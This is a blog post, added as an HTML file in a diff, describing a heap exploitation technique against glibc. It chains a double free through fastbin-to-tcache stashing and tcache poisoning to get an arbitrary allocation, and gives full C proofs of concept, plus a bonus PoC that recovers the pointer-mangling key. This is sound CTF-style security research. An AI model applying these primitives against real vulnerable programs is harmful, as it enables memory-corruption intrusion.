@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="IntroductionHi all, today I will showcase a new (at least I do not believe I have seen it in writeups before, nor does it seem to be in how2heap) method of exploiting double free. In essence, this tec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A new way to tcache_dup">
+<meta property="og:url" content="https://fern89.github.io/2025/09/20/doublefree/index.html">
+<meta property="og:site_name" content="fern&#39;s blog">
+<meta property="og:description" content="IntroductionHi all, today I will showcase a new (at least I do not believe I have seen it in writeups before, nor does it seem to be in how2heap) method of exploiting double free. In essence, this tec">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-09-20T14:08:27.000Z">
+<meta property="article:modified_time" content="2025-09-20T14:12:01.448Z">
+<meta property="article:author" content="fern">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>A new way to tcache_dup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/09/16/inductive-bias/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://fern89.github.io/2025/09/20/doublefree/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://fern89.github.io/2025/09/20/doublefree/&text=A new way to tcache_dup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://fern89.github.io/2025/09/20/doublefree/&is_video=false&description=A new way to tcache_dup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=A new way to tcache_dup&body=Check out this article: https://fern89.github.io/2025/09/20/doublefree/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://fern89.github.io/2025/09/20/doublefree/&name=A new way to tcache_dup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://fern89.github.io/2025/09/20/doublefree/&t=A new way to tcache_dup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technique"><span class="toc-number">2.</span> <span class="toc-text">Technique</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">3.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-small-bonus"><span class="toc-number">4.</span> <span class="toc-text">A small bonus</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        A new way to tcache_dup
+    </h1>
+
+
+
+    <div class="meta">
+      fern
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-20T14:08:27.000Z" class="dt-published" itemprop="datePublished">2025-09-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hi all, today I will showcase a new (at least I do not believe I have seen it in writeups before, nor does it seem to be in how2heap) method of exploiting double free. In essence, this technique aims to make tcache dup great again (it’s actually quite similar to <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">house of botcake</a>, but is far simpler, requiring one fewer chunk allocated).</p>
+<p>Here are the conditions to apply this attack:</p>
+<ul>
+<li>Double free (this is the main primitive)</li>
+<li>Able to allocate up to 9 chunks at any given time</li>
+<li>Heap leak (to perform tcache poisoning)</li>
+</ul>
+<p>And here is the advantage of the attack:</p>
+<ul>
+<li>Only write-on-alloc required, no edit functionality</li>
+<li>Only single size allocate required (ie, if the challenge only allows you to allocate chunks of size N, this will still work so long as n &lt;&#x3D; 0x78, excluding metadata). This is what sets it apart most from house of botcake, as that requires that you allocate chunks of differing sizes</li>
+<li>No requirements of valid free size (unlike <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup_into_stack.c">fastbin dup into stack</a>)</li>
+<li>Works in all latest libc, tested 2.35 and 2.41</li>
+</ul>
+<h2 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h2><p>So let us look at <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3860">https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3860</a>. This is the 2.35 source, but just search for the string and you can find it in other libc versions. Code says:</p>
+<figure class="highlight c"><figcaption><span>malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">3860</span><br><span class="line">3861</span><br><span class="line">3862</span><br><span class="line">3863</span><br><span class="line">3864</span><br><span class="line">3865</span><br><span class="line">3866</span><br><span class="line">3867</span><br><span class="line">3868</span><br><span class="line">3869</span><br><span class="line">3870</span><br><span class="line">3871</span><br><span class="line">3872</span><br><span class="line">3873</span><br><span class="line">3874</span><br><span class="line">3875</span><br><span class="line">3876</span><br><span class="line">3877</span><br><span class="line">3878</span><br><span class="line">3879</span><br><span class="line">3880</span><br><span class="line">3881</span><br><span class="line">3882</span><br><span class="line">3883</span><br><span class="line">3884</span><br><span class="line">3885</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">	 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s also look at the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3174">tcache_put</a> function referenced,</p>
+<figure class="highlight c"><figcaption><span>malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">3174</span><br><span class="line">3175</span><br><span class="line">3176</span><br><span class="line">3177</span><br><span class="line">3178</span><br><span class="line">3179</span><br><span class="line">3180</span><br><span class="line">3181</span><br><span class="line">3182</span><br><span class="line">3183</span><br><span class="line">3184</span><br><span class="line">3185</span><br><span class="line">3186</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>As can clearly be seen, there are NO protections against double free anywhere during the malloc! That means, we can bypass the double free checker in tcache, and bring back the good old malloc_dup that died long ago in 2.29!</p>
+<p>So let’s come up with a plan. Let us start by making a target, something 0x10-aligned on stack because that is still checked in <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3195">tcache_get</a>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"><span class="type">uint64_t</span> target[<span class="number">4</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Target on stack: %p\n&quot;</span>, target);</span><br></pre></td></tr></table></figure>
+
+<p>Now we want to get something into fastbin first, so we can actually get an a-&gt;b-&gt;a chain going, to get a double free. This is just standard <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup.c">fastbin_dup</a>. We must malloc a total of 9 times, to obtain 7 chunks to fill tcache, then 2 chunks to dump into double free. Then we free first 7.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc 9 chunks...\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span>* chunks[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++) chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free 7 chunks. Now tcache is full, we go to fastbin.\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) <span class="built_in">free</span>(chunks[i]);</span><br></pre></td></tr></table></figure>
+
+<p>Performing the fastbin dup,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Perform fastbin dup...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunks[<span class="number">7</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunks[<span class="number">8</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunks[<span class="number">7</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now fastbin has a-&gt;b-&gt;a\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Now our tcache has 7 chunks, while our fastbin has a-&gt;b-&gt;a! Let us clear the tcache, so we can access fastbin,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Clearing tcache...\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
+
+<p>So now, our tcache is empty, while our fastbin still has a-&gt;b-&gt;a. Now it is time for the magic, once we alloc a from the fastbin, b-&gt;a is moved into tcache! And since we have write-on-alloc, we can just perform classic <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c">tcache poisoning</a>!</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span>* a = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We alloc a = %p. Now tcache has b -&gt; a.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Performing tcache poisoning...\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> ptr = (<span class="type">uint64_t</span>)target;</span><br><span class="line"><span class="type">uint64_t</span> addr = (<span class="type">uint64_t</span>)a;</span><br><span class="line">a[<span class="number">0</span>] = (addr &gt;&gt; <span class="number">12</span>) ^ ptr;</span><br></pre></td></tr></table></figure>
+
+<p>Now tcache has b-&gt;a-&gt;target! We take out b-&gt;a, and finally, we get our arbitrary allocation!</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc b = %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a = %p = %p. Now our next chunk should be controlled!\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>), a);</span><br><span class="line"><span class="type">uint64_t</span>* win = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control! %p == %p\n&quot;</span>, win, target);</span><br><span class="line">assert((<span class="type">uint64_t</span>) win == (<span class="type">uint64_t</span>) target);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>I feel this technique is a very good complement to house of botcake in making tcache dup great again. However, a minor thing that has been irking me, is that I am not entirely sure WHY the target alloc works. In theory, after the first alloc of a, the count in tcache should only be 2. This means that, only b-&gt;a should picked up from tcache, not the target! I am really unsure why this works, and the libc source code doesn’t seem to give any clues, if you have an idea, please contact me @fern73 on discord.</p>
+<p>Here is the complete code for the PoC:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_SZ 0x30 <span class="comment">// any number up to 0x78</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="type">uint64_t</span> target[<span class="number">4</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target on stack: %p\n&quot;</span>, target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Alloc 9 chunks...\n&quot;</span>);</span><br><span class="line">    <span class="type">uint64_t</span>* chunks[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++) chunks[i] = <span class="built_in">malloc</span>(ALLOC_SZ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Free 7 chunks. Now tcache is full, we go to fastbin.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) <span class="built_in">free</span>(chunks[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Perform fastbin dup...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunks[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunks[<span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunks[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now fastbin has a-&gt;b-&gt;a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Clearing tcache...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++) <span class="built_in">malloc</span>(ALLOC_SZ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, we allocate another chunk. This will pull from the fastbin, and cause all the fastbin chunks to be transferred to tcache!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;See https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3861 for more info.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Note that double free protection within tcache is NOT activated during this!\n&quot;</span>);</span><br><span class="line">    <span class="type">uint64_t</span>* a = <span class="built_in">malloc</span>(ALLOC_SZ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We alloc a = %p. Now tcache has b -&gt; a.\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Performing tcache poisoning...\n&quot;</span>);</span><br><span class="line">    <span class="type">uint64_t</span> ptr = (<span class="type">uint64_t</span>)target;</span><br><span class="line">    <span class="type">uint64_t</span> addr = (<span class="type">uint64_t</span>)a;</span><br><span class="line">    a[<span class="number">0</span>] = (addr &gt;&gt; <span class="number">12</span>) ^ ptr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Alloc b = %p\n&quot;</span>, <span class="built_in">malloc</span>(ALLOC_SZ));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Alloc a = %p = %p. Now our next chunk should be controlled!\n&quot;</span>, <span class="built_in">malloc</span>(ALLOC_SZ), a);</span><br><span class="line">    <span class="type">uint64_t</span>* win = <span class="built_in">malloc</span>(ALLOC_SZ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We got the control! %p == %p\n&quot;</span>, win, target);</span><br><span class="line">    assert((<span class="type">uint64_t</span>) win == (<span class="type">uint64_t</span>) target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="A-small-bonus"><a href="#A-small-bonus" class="headerlink" title="A small bonus"></a>A small bonus</h2><p>So while studying libc, I also came across potential new method for WWW2exec. It’s just a reskin of common exit handler, <code>initial+24</code> override method, but I realize that first function pointer (ie what’s there before override) can reveal the <code>PTR_MANGLE</code> cookie already, this is helpful especially in new libc where TLS is no longer at constant offset from libc.</p>
+<p>The first function pointer goes to <code>_dl_fini</code>, which is in ld, and as of libc 2.41, is still at constant offset from libc base, so just a libc leak is sufficient. But the issue with this method is, <code>initial+24</code> is not 0x10 aligned (at least in my libc), so printf leaking of <code>initial+24</code> is impossible, as the value at <code>initial+16</code> is 0x4, many many null bytes. But I think it is still applicable to some challenge which alloc a <code>struct</code> instead of <code>char*</code>. So here is a simple PoC:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INITIAL_OFFSET 0x1d42e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DL_FINI_OFFSET 0x20c680</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_OFFSET 0x525b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ull unsigned long long</span></span><br><span class="line">ull <span class="title function_">findKey</span><span class="params">(ull unmangled_v, ull mangled_v)</span>&#123;</span><br><span class="line">    ull rotated_val = (mangled_v &gt;&gt; <span class="number">0x11</span>) | (mangled_v &lt;&lt; (<span class="number">64</span> - <span class="number">0x11</span>));</span><br><span class="line">    <span class="keyword">return</span> rotated_val ^ unmangled_v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ull libc_base = (ull)&amp;<span class="built_in">printf</span> - PRINTF_OFFSET;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC BASE: %p\n&quot;</span>, libc_base);</span><br><span class="line">    ull initial_plus_24 = libc_base + INITIAL_OFFSET + <span class="number">24</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;initial+24: %p\n&quot;</span>, initial_plus_24);</span><br><span class="line">    ull mangled = *(ull*)initial_plus_24;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;MANGLED: %p\n&quot;</span>, mangled);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ENCRYPTION KEY: %p\n&quot;</span>, findKey(libc_base + DL_FINI_OFFSET, mangled));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;int3&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Of course, offsets need to be changed for your libc, I am using 2.35 on Debian 12.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technique"><span class="toc-number">2.</span> <span class="toc-text">Technique</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">3.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-small-bonus"><span class="toc-number">4.</span> <span class="toc-text">A small bonus</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://fern89.github.io/2025/09/20/doublefree/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://fern89.github.io/2025/09/20/doublefree/&text=A new way to tcache_dup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://fern89.github.io/2025/09/20/doublefree/&title=A new way to tcache_dup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
